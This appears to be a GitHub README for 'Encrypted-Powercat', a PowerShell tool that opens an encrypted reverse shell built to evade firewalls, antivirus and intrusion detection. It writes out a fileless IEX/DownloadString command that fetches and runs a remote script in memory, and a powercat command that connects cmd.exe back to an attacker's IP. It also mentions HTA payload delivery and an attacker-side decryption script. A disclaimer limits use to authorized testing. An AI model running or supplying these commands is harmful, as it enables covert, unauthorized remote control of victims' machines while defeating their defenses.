# Encrypted-Powercat

Encrypted-Powercat is a custom implementation of the Powercat utility that establishes a stealthy, encrypted reverse shell while evading detection by firewalls, antivirus solutions, and Intrusion Detection Systems (IDS). This project demonstrates the use of encryption and PowerShell-based techniques to achieve secure and stealthy communication.

## Features

- **Encrypted Communication:** Ensures secure data transmission using encryption.
- **Fileless Execution:** Executes scripts directly in memory to evade file-based detection mechanisms.
- **Firewall Evasion:** Utilizes commonly allowed ports, such as port 443, to bypass network firewalls.
- **Detection Evasion:** Combines payload obfuscation and in-memory execution to avoid antivirus and IDS/IPS detection.

---

## How It Works

1. **Powercat Script**: 
   - Powercat is downloaded and executed directly in memory using a single PowerShell command.
   - Example Command:
     ```powershell
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/zakaria-ahmd20/encrypted-powercat/main/powercat.ps1');
     ```

2. **Reverse Shell Execution**:
   - The reverse shell is established by executing the following command after loading the script:
     ```powershell
     powercat -c <attacker-ip> -p <port> -e cmd.exe -ge
     ```
   - Options:
     - `-c`: Connects to the specified IP (attacker's machine).
     - `-p`: Specifies the port to connect to.
     - `-e`: Executes the specified program (e.g., cmd.exe).
     - `-ge`: Enables encryption for secure communication.

3. **Encrypted Session Decryption**:
   - On the attacker's machine, a Python script (`decrypt.py`) is used to decrypt incoming data.

4. **Payload Delivery**:
   - The project demonstrates delivering payloads via trusted methods, such as using an HTA file, to further evade detection.

---

## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/zakaria-ahmd20/encrypted-powercat.git
   cd encrypted-powercat
   ```

2. Run the reverse shell command from the target machine:
   ```powershell
   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/zakaria-ahmd20/encrypted-powercat/main/powercat.ps1');
   powercat -c <attacker-ip> -p <port> -e cmd.exe -ge
   ```

3. Decrypt the session data on the attacker's machine using the provided Python script:
   ```bash
   python3 decrypt.py
   ```

---

## Requirements

- **Target Machine:**
  - PowerShell (built-in on Windows systems)
  - Internet access (to download the script)

- **Attacker Machine:**
  - Python 3.x
  - Network listener (e.g., Netcat or Powercat) on the specified port

---

## Security and Ethical Use

This tool is intended for educational and authorized security testing purposes only. Unauthorized use of this project to access systems without explicit permission is illegal and unethical.

---

## License

This project is licensed under the MIT License. See the `LICENSE` file for more details.

---

## Contributing

Contributions to improve or expand the functionality of this project are welcome. Please open an issue or submit a pull request.

---

## Acknowledgments

- Inspired by the original Powercat utility.
- Special thanks to the open-source community for providing tools and techniques that made this project possible.

---

## Disclaimer

Use this tool responsibly. The author is not responsible for any misuse or damages caused by this project.
